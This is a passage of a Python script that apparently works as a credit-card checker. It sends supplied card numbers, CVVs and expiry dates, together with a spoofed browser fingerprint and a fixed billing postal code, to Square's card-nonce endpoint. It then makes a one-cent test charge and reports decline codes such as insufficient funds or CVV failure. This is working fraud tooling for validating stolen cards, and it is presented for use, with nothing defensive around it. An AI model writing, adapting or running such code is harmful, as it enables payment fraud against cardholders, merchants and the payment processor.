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"},"touch_support":{"maxTouchPoints":0,"touchEvent":false,"touchStart":false},"vendor_flavors":["chrome"],"color_gamut":"srgb","forced_colors":false,"monochrome":0,"contrast":0,"reduced_motion":false,"hdr":false,"math":{"acos":1.4473588658278522,"acosh":709.889355822726,"acoshPf":355.291251501643,"asin":0.12343746096704435,"asinh":0.881373587019543,"asinhPf":0.8813735870195429,"atanh":0.5493061443340548,"atanhPf":0.5493061443340548,"atan":0.4636476090008061,"sin":0.8178819121159085,"sinh":1.1752011936438014,"sinhPf":2.534342107873324,"cos":-0.8390715290095377,"cosh":1.5430806348152437,"coshPf":1.5430806348152437,"tan":-1.4214488238747245,"tanh":0.7615941559557649,"tanhPf":0.7615941559557649,"exp":2.718281828459045,"expm1":1.718281828459045,"expm1Pf":1.718281828459045,"log1p":2.3978952727983707,"log1pPf":2.3978952727983707,"powPI":1.9275814160560206e-50},"video_card":{"vendor":"Google Inc. (Intel)","renderer":"ANGLE (Intel, Intel(R) UHD Graphics (0x00009A68) Direct3D11 vs_5_0 ps_5_0, D3D11)"},"pdf_viewer_enabled":true}',
                    'fingerprint': '752a0ff422faa295c40ade2e7e838ab6',
                    'version': 'fingerprint-v2',
                },
            ],
            'timezone': '-330',
            # 'website_url': 'https://www.myfetetickets.com',
        },
        'client_id': SQUARE_APPLICATION_ID,
        'instance_id': instance,
        'location_id': SQUARE_LOCATION,
        'payment_method_tracking_id': 'c9554061-43c7-a0a8-50e5-b4531b12e09b',
        'session_id': session,
        'pow_counter': pow,
        'card_data': {
            'billing_postal_code' :'10080',
            'cvv': cvv,
            'exp_month': mmm,
            'exp_year': yyy,
            'number': cc,
        },
    }

    response = requests.post(
        'https://pci-connect.squareup.com/v2/card-nonce',
        params=params,
        headers=headers,
        json=json_data,
    )
    try:
        card_nonce = response.json()['card_nonce']
    except KeyError:
        return 'Error: Card nonce not found'
    idempotency_key = str(uuid.uuid4())
    SQUARE_API_URL = "https://connect.squareup.com/v2/payments"
    headers = {
        "Authorization": f"Bearer {SQUARE_TOKEN}",
        "Content-Type": "application/json",
        "Square-Version": "2024-01-18",
    }
    data = {
        "idempotency_key": idempotency_key,
        "amount_money": {
            "amount": 1,
            "currency": "USD"
        },
        "source_id": card_nonce,
        "location_id": SQUARE_LOCATION
    }
    response = requests.post(SQUARE_API_URL, headers=headers, json=data)
    if response.status_code == 200:
        return 'Charged $0.01'
    elif response.status_code == 400:
        code = response.json()['errors'][0]['code']
        detail = response.json()['errors'][0]['detail']
        if code:
            return code
        else:
            return detail
    else:
        return 'Error: Unknown error'
        
# INSUFFICIENT_FUNDS
# ADDRESS_VERIFICATION_FAILURE
# CVV_FAILURE
# TRANSACTION_LIMIT
